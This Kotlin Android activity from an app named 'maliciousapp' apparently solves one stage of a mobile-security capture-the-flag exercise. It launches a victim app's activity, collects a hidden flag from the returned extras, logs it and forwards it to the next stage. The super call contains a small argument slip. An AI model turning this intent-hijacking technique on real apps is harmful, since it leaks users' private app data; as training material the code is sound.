package com.example.maliciousapp

import android.app.Activity
import android.content.ComponentName
import android.content.Intent
import android.os.Bundle
import android.util.Log
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity

class PartThree : AppCompatActivity() {
    var flag = ""

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        flag = intent?.getStringExtra("flag") ?: "[null]"

        val sendIntent = Intent().apply {
            component = ComponentName(
                "com.example.victimapp",
                "com.example.victimapp.PartThree"
            )
        }
        startActivityForResult(sendIntent, 3)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, intent: Intent?) {
        super.onActivityResult(resultCode, resultCode, intent)

        val view = findViewById<TextView>(R.id.debug_text)
        intent?.getExtras()?.let { extras ->
            flag += extras.getCharSequence("hiddenFlag")

            Log.w("MOBIOTSEC", "Part 3: $flag")

            startActivity(
                Intent(this, PartFour::class.java)
                    .putExtra("flag", flag)
            )
        }
    }
}
